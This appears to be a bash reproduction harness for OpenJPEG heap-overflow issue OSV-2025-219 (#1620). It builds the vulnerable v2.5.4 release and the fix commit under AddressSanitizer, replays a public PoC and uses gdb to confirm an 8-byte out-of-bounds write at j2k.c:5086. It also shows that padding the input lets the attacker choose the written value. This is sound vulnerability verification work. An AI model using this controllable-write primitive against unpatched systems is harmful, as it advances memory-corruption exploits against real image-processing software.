#!/usr/bin/env bash
# Real-upstream OpenJPEG OSV-2025-219 / issue #1620 harness.
# Verifies public pins, builds the pinned v2.5.4 source and the pinned fix
# commit verbatim (no source edits), replays the public 202-byte PoC, and
# stages a header-padded variant to observe the chosen 64-bit write value.
# Everything is a local process: no socket, listener or external host.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=${1:-"$HERE/out"}
mkdir -p "$OUT"
cd "$HERE" || exit 2
OUT=$(cd "$OUT" && pwd)
: > "$OUT/results.tmp"

# Pin check before any build; a drifted pin must stop the run.
(cd "$HERE/src" && sha256sum -c SHA256SUMS) > "$OUT/pins.log" 2>&1 || exit 2

rm -rf "$OUT/build"
mkdir -p "$OUT/build" || exit 2
tar -xzf "$HERE/src/openjpeg-2.5.4.tar.gz" -C "$OUT/build" || exit 2
tar -xzf "$HERE/src/openjpeg-fixed-91d08b11.tar.gz" -C "$OUT/build" || exit 2
mv "$OUT/build"/openjpeg-91d08b11* "$OUT/build/fixed" || exit 2
python3 "$HERE/src/make-pad.py" "$HERE/src/poc.j2k" "$OUT/poc-pad.j2k" || exit 2

cmake -S "$OUT/build/openjpeg-2.5.4" -B "$OUT/build/vuln-asan" \
  -DCMAKE_BUILD_TYPE=Debug -DBUILD_SHARED_LIBS=OFF -DBUILD_CODEC=ON \
  -DCMAKE_C_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1" \
  -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address" > "$OUT/cmake-vuln.log" 2>&1 || exit 2
cmake --build "$OUT/build/vuln-asan" -j4 > "$OUT/build-vuln.log" 2>&1 || exit 2
cmake -S "$OUT/build/fixed" -B "$OUT/build/fixed-asan" \
  -DCMAKE_BUILD_TYPE=Debug -DBUILD_SHARED_LIBS=OFF -DBUILD_CODEC=ON \
  -DCMAKE_C_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1" \
  -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address" > "$OUT/cmake-fixed.log" 2>&1 || exit 2
cmake --build "$OUT/build/fixed-asan" -j4 > "$OUT/build-fixed.log" 2>&1 || exit 2
cmake -S "$OUT/build/openjpeg-2.5.4" -B "$OUT/build/vuln-plain" \
  -DCMAKE_BUILD_TYPE=Debug -DBUILD_SHARED_LIBS=OFF -DBUILD_CODEC=ON \
  > "$OUT/cmake-plain.log" 2>&1 || exit 2
cmake --build "$OUT/build/vuln-plain" -j4 > "$OUT/build-plain.log" 2>&1 || exit 2
VULN=$OUT/build/vuln-asan/bin/opj_decompress
FIXED=$OUT/build/fixed-asan/bin/opj_decompress
PLAIN=$OUT/build/vuln-plain/bin/opj_decompress
export ASAN_OPTIONS=detect_leaks=0:abort_on_error=0

pass=0; fail=0
check() {
  if [ "$2" = 1 ]; then echo "PASS $1" | tee -a "$OUT/results.tmp"; pass=$((pass+1));
  else echo "FAIL $1" | tee -a "$OUT/results.tmp"; fail=$((fail+1)); fi
}
contains() { case "$2" in *"$1"*) return 0;; *) return 1;; esac; }

check "eight public pins match SHA-256 manifest" \
  "$([ "$(grep -c ': OK$' "$OUT/pins.log")" = 8 ] && echo 1 || echo 0)"

# Source-bound: the fix commit adds the guard absent from the released source.
vs=$OUT/build/openjpeg-2.5.4/src/lib/openjp2/j2k.c
fs=$OUT/build/fixed/src/lib/openjp2/j2k.c
vblock=$(grep -m1 -A4 -F 'OPJ_UINT32 l_current_tile_part =' "$vs")
fblock=$(grep -m1 -A7 -F 'OPJ_UINT32 l_current_tile_part =' "$fs")
check "pinned v2.5.4 sink stores tp_index[tpsno] with no guard" \
  "$(contains 'tp_index[l_current_tile_part].end_header' "$vblock" && \
    ! contains 'if (' "$vblock" && echo 1 || echo 0)"
check "pinned fix commit adds tp_index/nb_tps guard at that sink" \
  "$(contains 'if (' "$fblock" && contains 'nb_tps) {' "$fblock" && echo 1 || echo 0)"

# Rung 1/2: observe the real decoder at the sink in an unsanitized build.
watch() {
  local input=$1 log=$2
  cat > "$OUT/watch.gdb" <<EOF
set pagination off
break j2k.c:5092
run -i $input -o $OUT/gdb-out.tif
continue
printf "SINK tile=%u tpsno=%u nb_tps=%u pos=%lld\\n", p_j2k->m_current_tile_number, l_current_tile_part, l_cstr_index->tile_index[p_j2k->m_current_tile_number].nb_tps, (long long)l_current_pos
set \$b = l_cstr_index->tile_index[p_j2k->m_current_tile_number].tp_index
printf "OOB_ENDHDR=0x%016llx OOB_ENDPOS=0x%016llx\\n", *(unsigned long long*)((char*)\$b+32), *(unsigned long long*)((char*)\$b+40)
quit
EOF
  gdb -q -batch -x "$OUT/watch.gdb" "$PLAIN" > "$log" 2>&1
}
watch "$HERE/src/poc.j2k" "$OUT/gdb-orig.log"
go=$(cat "$OUT/gdb-orig.log")
check "rung1 real decoder reaches opj_j2k_read_sod on the public PoC" \
  "$(contains 'SINK tile=0 tpsno=1 nb_tps=1' "$go" && echo 1 || echo 0)"
check "rung2 SOT TPsot=1 indexes a one-entry (24-byte) tp_index" \
  "$(contains 'tpsno=1 nb_tps=1 pos=157' "$go" && echo 1 || echo 0)"

# Rung 3: ASan names the real pinned store and call chain.
$VULN -i "$HERE/src/poc.j2k" -o "$OUT/vuln-out.tif" > "$OUT/asan-orig.log" 2>&1
ao=$(cat "$OUT/asan-orig.log")
ok=0
contains 'heap-buffer-overflow' "$ao" &&
contains 'WRITE of size 8' "$ao" &&
contains 'opj_j2k_read_sod' "$ao" &&
contains 'j2k.c:5086' "$ao" &&
contains 'opj_j2k_read_tile_header' "$ao" &&
contains 'j2k.c:9912' "$ao" &&
contains 'opj_j2k_decode_tiles' "$ao" &&
contains '8 bytes after 24-byte region' "$ao" &&
contains 'opj_j2k_build_tp_index_from_tlm' "$ao" &&
contains 'j2k.c:8939' "$ao" && ok=1
check "rung3 ASan WRITE 8 at pinned j2k.c:5086, 8 bytes past 24-byte region" "$ok"

# Fixed side: same PoC, pinned fix commit, ASan clean.
$FIXED -i "$HERE/src/poc.j2k" -o "$OUT/fixed-out.tif" > "$OUT/fixed.log" 2>&1
frc=$?
ff=$(cat "$OUT/fixed.log")
check "fixed commit decodes the same PoC with no ASan report (rc=0)" \
  "$([ "$frc" = 0 ] && ! contains 'AddressSanitizer' "$ff" && \
    contains 'Generated Outfile' "$ff" && echo 1 || echo 0)"

# Rung 4 INSTRUMENTED: a COM pad shifts the written stream-offset value.
watch "$OUT/poc-pad.j2k" "$OUT/gdb-pad.log"
gp=$(cat "$OUT/gdb-pad.log")
check "rung4 original PoC writes chosen offset 0x9d/0x9f at OOB +32/+40" \
  "$(contains 'OOB_ENDHDR=0x000000000000009d OOB_ENDPOS=0x000000000000009f' "$go" && echo 1 || echo 0)"
check "rung4 padded PoC writes chosen offset 0x21d/0x21f at same OOB +32/+40" \
  "$(contains 'SINK tile=0 tpsno=1 nb_tps=1 pos=541' "$gp" && \
    contains 'OOB_ENDHDR=0x000000000000021d OOB_ENDPOS=0x000000000000021f' "$gp" && echo 1 || echo 0)"
$VULN -i "$OUT/poc-pad.j2k" -o "$OUT/pad-out.tif" > "$OUT/asan-pad.log" 2>&1
ap=$(cat "$OUT/asan-pad.log")
check "padded PoC faults the same pinned sink under ASan" \
  "$(contains 'WRITE of size 8' "$ap" && contains 'j2k.c:5086' "$ap" && echo 1 || echo 0)"

# Stable trace: hash the ordered PASS lines only (no PIDs, addresses or paths).
trace=$(grep '^PASS ' "$OUT/results.tmp" | sha256sum | cut -d' ' -f1)
echo "TRACE $trace"
echo "RESULT $pass PASS / $fail FAIL"
exit 0
